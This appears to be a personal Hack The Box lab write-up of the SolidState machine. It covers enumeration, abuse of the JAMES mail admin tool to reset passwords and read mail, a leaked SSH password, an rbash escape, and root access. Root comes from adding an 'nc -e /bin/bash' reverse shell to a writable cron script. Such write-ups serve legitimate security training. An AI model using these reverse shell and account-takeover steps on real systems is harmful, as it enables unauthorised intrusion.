https://app.hackthebox.com/machines/SolidState

Preparation
```sh
export target=10.10.10.51;
```
```sh
mkdir -p ~/htb/machines/solidstate && cd ~/htb/machines/solidstate;
export target=10.10.10.51;
echo $target;
mkdir nmap;
mkdir gobuster;
```

Enumeration
```sh
sudo nmap -p- -Pn -sS --open -n --min-rate 5000 -oN "nmap/quick" $target
sudo nmap -A --min-rate 5000 -oN "nmap/full" -p22,80,110,119,4555 $target
```

```
webadmin@solid-state-security.com
Solid State by HTML5 UP

Server: Apache/2.4.25 (Debian)
```

```sh
nc $target 4555
# JAMES Remote Administration Tool 2.3.2
```

![[Pasted image 20240830085201.png]]

![[Pasted image 20240830085137.png]]

Found an exploit for this version of `JAMES` - https://www.exploit-db.com/exploits/50347
Will be useful in a moment.

![[Pasted image 20240830090003.png]]

```sh
# users
james
thomas
john
mindy
mailadmin
```

Enumerated all users, I can access their emails by changing the password as I have `root` and see if there is anything interesting to obtain shell on the machine. To view emails, use an email client for Linux - Mozilla Thunderbird.

https://ipv6.rs/tutorial/Kali_Linux_Latest/Thunderbird/ - I set symbolic link to `/usr/local/bin/thunderbird/`.


https://www.suburbancomputer.com/tips_email.htm
**POP3 Commands (Receive Email)**

| Command       | Comment                                       |
| ------------- | --------------------------------------------- |
| USER          | Your user name for this mail server           |
| PASS          | Your password.                                |
| QUIT          | End your session.                             |
| STAT          | Number and total size of all messages         |
| LIST          | Message# and size of message                  |
| RETR message# | Retrieve selected message                     |
| DELE message# | Delete selected message                       |
| NOOP          | No-op. Keeps you connection open.             |
| RSET          | Reset the mailbox. Undelete deleted messages. |

Enumerating all emails from all users.

![[Pasted image 20240830093527.png]]

![[Pasted image 20240830093916.png]]

```sh
mindy:P@55W0rd1!2@
```

Try to SSH into machine.

![[Pasted image 20240830094256.png]]

```sh
cat user.txt
a590f14039b34ebf31e2aef613f9f556
```

Restricted bash -> try to escape.

```sh
ssh mindy@10.10.10.51 "bash"
```

Escaped `rbash` into `bash`.
https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290

Obtain interactive tty with python.
```sh
which python
python -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty -a; stty raw -echo; fg
export TERM=xterm; stty rows 39 columns 167
```

Enumerate further with linpeas.

```sh
/opt/tmp.py
# owned by root but 777 permissions
nano /opt/tmp.py
...
	os.system('nc -e /bin/bash 10.10.14.6 1234')
CTRL+X
# Attacker
nc -lvnp 1234
```

Script will run and root is obtained.

```sh
75bbca1b61d0bdeb6cfe024e24a2cec3
```

**QUESTIONS**

![[Pasted image 20240830111635.png]]

I found the script even manually, but I couldn't find where is it defined that it's run every three minutes. I suppose I could create a file in `/tmp/` directory and try to time it myself, but is there a better way? Hint mentions `pspy`

I tried to edit the script and add a python system call to do a bash reverse shell but it didn't work, why does bash not work and nc does?
